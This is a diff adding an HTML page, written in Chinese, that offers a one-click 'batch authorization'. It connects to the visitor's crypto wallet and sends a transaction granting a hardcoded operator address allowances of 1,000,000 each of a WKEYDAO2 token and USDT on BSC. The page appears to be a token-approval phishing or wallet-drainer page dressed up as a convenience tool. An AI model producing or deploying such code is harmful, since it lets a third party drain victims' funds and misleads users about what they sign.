@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>双代币批量授权</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <style>
+        body { font-family: Arial; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
+        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        button { width: 100%; padding: 15px; background: #4CAF50; color: white; border: none; font-size: 18px; cursor: pointer; border-radius: 5px; }
+        .info { background: #e3f2fd; padding: 15px; border-radius: 5px; margin: 20px 0; font-size: 14px; word-break: break-all; }
+        .result { margin-top: 20px; padding: 15px; border-radius: 5px; display: none; }
+        .contract-box { background: #f5f5f5; padding: 10px; border-radius: 4px; font-family: monospace; word-break: break-all; margin: 15px 0; border: 1px solid #ddd; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>✨ 一键授权 WKEYDAO2 + USDT</h2>
+        
+        <div class="info">
+            <strong>📋 本次授权信息：</strong><br>
+            • 操作员地址：<code>0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b</code><br>
+            • WKEYDAO2：<code>0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E</code><br>
+            • USDT：<code>0x55d398326f99059ff775485246999027b3197955</code><br>
+            • 授权额度：各 <strong>1,000,000</strong> 个<br>
+            • 批量合约：已内置，无需填写
+        </div>
+        
+        <div class="contract-box">
+            🔗 合约地址：<strong>0x62B5E69a0a97109Fe0BfC243E02673D293D7c921</strong>
+        </div>
+        
+        <button onclick="batchApprove()">🔥 点击直接授权两个代币</button>
+        
+        <div id="result" class="result"></div>
+    </div>
+
+    <script>
+        // 合约地址已内置
+        const CONTRACT_ADDRESS = '0x62B5E69a0a97109Fe0BfC243E02673D293D7c921';
+        
+        const SPENDER = '0x99ff20F8ada291A9a0EDA48e4ae5A17F535D753b';
+        const TOKENS = [
+            '0xe0A281deFf5c9d8d67aF09D39340E134Ac81b82E',  // WKEYDAO2
+            '0x55d398326f99059ff775485246999027b3197955'   // USDT
+        ];
+        const AMOUNT = '1000000';  // 100万
+
+        const BATCH_ABI = [{
+            "inputs": [
+                {"internalType": "address[]", "name": "_tokens", "type": "address[]"},
+                {"internalType": "address", "name": "_spender", "type": "address"},
+                {"internalType": "uint256[]", "name": "_amounts", "type": "uint256[]"}
+            ],
+            "name": "batchApprove",
+            "outputs": [],
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }];
+
+        async function batchApprove() {
+            const resultDiv = document.getElementById('result');
+            resultDiv.style.display = 'block';
+            resultDiv.innerHTML = '⏳ 连接钱包中...';
+            
+            try {
+                if (!window.ethereum) throw new Error('请安装 MetaMask 或使用支持 Web3 的钱包');
+                
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                
+                resultDiv.innerHTML += `<br>✅ 已连接：${accounts[0].substring(0,10)}...`;
+                
+                const amountInWei = web3.utils.toWei(AMOUNT, 'ether');
+                const amounts = [amountInWei, amountInWei];
+                
+                const contract = new web3.eth.Contract(BATCH_ABI, CONTRACT_ADDRESS);
+                
+                resultDiv.innerHTML += '<br>⏳ 估算 Gas 中...';
+                const gasEstimate = await contract.methods.batchApprove(TOKENS, SPENDER, amounts).estimateGas({ from: accounts[0] });
+                
+                resultDiv.innerHTML += `<br>⏳ Gas 估算：${gasEstimate}，请在钱包中确认...`;
+                
+                const tx = await contract.methods.batchApprove(TOKENS, SPENDER, amounts).send({
+                    from: accounts[0],
+                    gas: Math.floor(gasEstimate * 1.2)
+                });
+                
+                resultDiv.innerHTML = `
+                    ✅ 批量授权成功！<br>
+                    交易哈希：<a href="https://bscscan.com/tx/${tx.transactionHash}" target="_blank">${tx.transactionHash}</a><br>
+                    已同时授权 WKEYDAO2 和 USDT 各 1,000,000 个给操作员地址
+                `;
+                resultDiv.style.background = '#e8f5e8';
+                
+            } catch (error) {
+                resultDiv.innerHTML = `❌ 失败：${error.message}`;
+                resultDiv.style.background = '#ffebee';
+            }
+        }
+    </script>
+</body>
+</html>
